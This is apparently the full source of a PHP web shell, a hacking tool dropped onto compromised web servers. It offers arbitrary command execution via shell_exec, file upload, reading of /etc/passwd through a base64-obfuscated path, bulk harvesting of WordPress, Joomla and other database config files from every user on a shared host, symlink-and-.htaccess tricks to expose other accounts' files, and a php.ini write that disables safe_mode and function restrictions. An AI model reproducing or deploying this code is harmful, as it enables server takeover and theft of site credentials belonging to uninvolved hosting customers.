<center>
<h2>
<a href="?action=sniper">Symlink File</a>
</h2>
</ul>
</body>
</html>
<?php


if(!isset($_GET['action']) or $_GET['action'] == "about"){
}
else if($_GET['action'] == "jump"){
echo '<center><form method="POST">
<input type=text name=path value="/home/"><br><br>
<textarea name=user class=etc>Passwd File Here :</textarea><br><br>
<input type=submit name=find value=Scan><br><br>
</form></center>';
$path = $_POST['path'];
$passwd = $_POST['user'];
$passwd = explode("\n", $passwd);
if($_POST['find']){
foreach ($passwd as $new) {
  $pwd = explode(":", $new);
  $users = $pwd[0];
  $all = $path.$users."/public_html/";
  if(is_readable($all)){
echo "<center><span class=f>[+] $all is Readable! [+]</span><center><br><br>";
}
}
}
}
else if($_GET['action'] == "etc"){
$text = "L2V0Yy9wYXNzd2Q=";
$passwd = file_get_contents(base64_decode($text));
echo "<center><textarea class=etc>".$passwd."</textarea></center>";
}
else if ($_GET['action'] == "upload"){
	echo "<center><form method=post ENCTYPE=\"multipart/form-data\">
	<input type=file name=file>
	<input type=submit name=up value=Upload>
	</form></center>
	";
	if($_POST['up']){
		if(copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])){
			echo "<br><center><font color=green size=20px style='text-shadow:0 0 5px;'>".$_FILES['file']['name']." Uploaded !</center></font>";
		}else{
			echo "<br><center><font color=red size=20px style='text-shadow:0 0 5px;'>".$_FILES['file']['name']."Failed !</center></font>";
		}
	}
}
else if ($_GET['action'] == "exec"){
echo '<center><form method=post>
<input type=text name=cmd placeholder=Command><br><br>
<input type=submit name=exec value=Exec>
</form></center>';
if($_POST['exec']){
	echo "<center><textarea class=etc>".shell_exec($_POST['cmd'])."</textarea></center>";
}
}
else if ($_GET['action'] == "priv8"){
echo "<center><h1>Hostgetor Bypass v1.0</h1></center><br>";
$file = file_get_contents("/etc/passwd");
if($file){
$passwd = explode("\n", $file);
if(is_dir("configs")){
	echo "<span class=e><center>Please Delete 'configs' Dir before use the tool !</span></center>";
	exit();
}
echo "<center><span class=e>All configs are<a href='configs' target='_blank'> Here</a></span><br><br></center>";
mkdir("configs");
foreach ($passwd as $user){
	$user =explode(":", $user);
	$users = $user[0];
	$path = array('/home/'.$users.'/public_html/vb/includes/config.php','/home/'.$users.'/public_html/includes/config.php','/home/'.$users.'/public_html/config.php','/home/'.$users.'/public_html/forum/includes/config.php','/home/'.$users.'/public_html/admin/conf.php','/home/'.$users.'/public_html/admin/config.php','/home/'.$users.'/public_html/wp-config.php','/home/'.$users.'/public_html/blog/wp-config.php','/home/'.$users.'/public_html/wp/wp-config.php','/home/'.$users.'/public_html/conf_global.php','/home/'.$users.'/public_html/include/db.php','/home/'.$users.'/public_html/connect.php','/home/'.$users.'/public_html/mk_conf.php','/home/'.$users.'/public_html/configuration.php','/home/'.$users.'/public_html/include/config.php','/home/'.$users.'/public_html/include/connect.php','/home/'.$users.'/public_html/joomla/configuration.php','/home/'.$users.'/public_html/whm/configuration.php','/home/'.$users.'/public_html/whmc/configuration.php','/home/'.$users.'/public_html/support/configuration.php','/home/'.$users.'/public_html/Settings.php','/home/'.$users.'/public_html/mainfile.php','/home/'.$users.'/public_html/includes/configure.php','/home/'.$users.'/public_html/html/config.php','/home/'.$users.'/public_html/includes/functions.php','/home/'.$users.'/public_html/conf.php');
	foreach ($path as $config) {
	if(file_exists($config)){
		$hand = fopen($config,"r");
		if($hand){
			$write = fopen("configs/$users.txt", "a");
			if(fwrite($write, fread($hand, filesize($config)))){
				echo "<center><span class=f>$config : Done !<br><br></span></center>";
			}
		}
	}	
	}
}
}else{
	echo "<center><span class=e>Can't Read etc/passwd</span></center>";
}
}
else if ($_GET['action'] == "sniper"){
	echo '<center><form method=post>
<input type=text placeholder="File Path ex: /home/user/public_html/wp-config.php" name=conf><br><br>
<input type=text name=dir placeholder="File.txt"><br><br>
<input type=submit name=go value=Symlink>
</form></center>';
if($_POST['go']){
	$config = $_POST['conf'];
	$dir = $_POST['dir'];
	if(mkdir($dir)){
		echo "<center><span class=f>$dir => Created !<br></span></center>";
	}
	$hand1 = fopen("$dir/.htaccess","w");
	$hatc = "Options +Indexes
ReadMeName $dir.txt";
	fwrite($hand1,$hatc);
	if(@symlink($config,"$dir/$dir.txt")){
		echo "<center><span class=f>Done => <a href='$dir' target=_blank>$dir.txt</a></span></center>";
	}
}
}
else if ($_GET['action'] == "safe"){
	$hand = fopen("php.ini", "w");
	$con = "safe_mode = off
disable_functions = none
	";
	if(fwrite($hand, $con)){
		echo "<center><span class=f>php.ini File Created !<span></center>";
	}
}
else if ($_GET['action'] == "forbidden"){
echo '<center><form method="post">
<input type="text" name="config" placeholder="Configs URL"><br><br>
<input type="text" name="br" placeholder="Configs Path ex : /home/user/pubic_html/configs"><br><br>
<input type="submit" name="ch" value="Bypass">
</form></center>';
if($_POST['ch']){
$br = $_POST['br'];
$get2 = file_get_contents($_POST['config']);
preg_match_all('#<a href="(.*?)"#', $get2, $config);
foreach($config[1] as $don){
if(mkdir($don)){
		echo "<center>$don => Created !<br><br></center>";
	}
	$hand1 = fopen("$don/.htaccess","w");
	$hatc = "Options +Indexes
ReadMeName $don.txt";
	fwrite($hand1,$hatc);
	if(@symlink($br."/".$don,"$don/$don.txt")){
		echo "<center><span class=f>Done => <a href='$don' target=_blank>$don.txt</a><span class=f></center><br>";
	}
}
}
}
else if ($_GET['action'] == "info"){
	$safe = ini_get("safe_mode");
if($safe == 1){
	$safe_mode =  "<font color=red>ON</font>";
	}else{
		$safe_mode = "<font color=green>OFF</font>";
		}
$dis = ini_get("disable_functions");
if($dis == ""){
	$disable = "<font color=green>None</font>";
	}else{
		$disable = "<font color=red>$dis</font>";
		}
$uname = php_uname();
$server = $_SERVER['SERVER_ADDR'];
$me = $_SERVER['REMOTE_ADDR'];
echo "
<div class=info>
<span class=info1>
Uname-a : $uname<br><br>
Safe Mode : $safe_mode<br><br>
Disable Functions : $disable<br><br>
</span>
<span class=info2>
Server IP : $server <br><br>
Your IP : $me <br><br>
</span>
</div>
";
}

echo " site: <font color=#18BC9C>" . $_SERVER['HTTP_HOST'] . "</font><br>";
echo " Your IP: <font color=#18BC9C>" . $_SERVER['REMOTE_ADDR'] . "</font><br>";
echo "Upload file";
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<font color=#18BC9C>&#1578;&#1605; &#1585;&#1601;&#1593; &#1588;&#1604; &#1575;&#1587;&#1578;&#1605;&#1578;&#1593; &#1601;&#1610; &#1575;&#1604;&#1582;&#1578;&#1585;&#1575;&#1602;</font><br>'; }
	else { echo '<font color=#18BC9C>Upload GAGAL !!!</font><br>'; }
{ echo '<font color=#18BC9C>anonymous_gaza</font><br>'; }
}

?>

<style>
body{
background-attachment: fixed;
background-image: url(http://store2.up-00.com/2016-08/1470835496521.jpg);
background-color:#0A0A0A;color:#e1e1e1;
 opacity: 0.7;
}
*{
	font-size:50px;
	font-family:Tahoma,Verdana,Arial;
}
#menu{
	background-color:transparan;
	margin:8px 2px 4px 2px;
}
body,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#FFFFFF; }
table.info{ color:#fff; background-color:#000000; }
span,a{ color: #66FF00 !important; }
span{ font-weight: bolder; }
h1{ border-left:5px solid #66FF00;padding: 2px 5px;font: 14pt Verdana;background-color:#000000;margin:0px;color:red; }
div.content{ padding: 5px;margin-left:5px;background-color:#333; }
a{ text-decoration:none; }
a:hover{ text-decoration:underline; }
.ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
.bigarea{ width:100%;height:250px; }
input,textarea,select{ margin:0;color:#fff;background-color:#000000;border:1px solid #66FF00; font: 9pt Monospace,'Courier New'; }
form{ margin:0px; }
#toolsTbl{ text-align:center; }
.toolsInp{ width: 300px }
.main th{text-align:left;background-color:#5e5e5e;}
.main tr:hover{background-color:#000000;}
.l1{background-color:#444}
.l2{background-color:#333}
pre{font-family:Courier,Monospace;}
</style>
</html>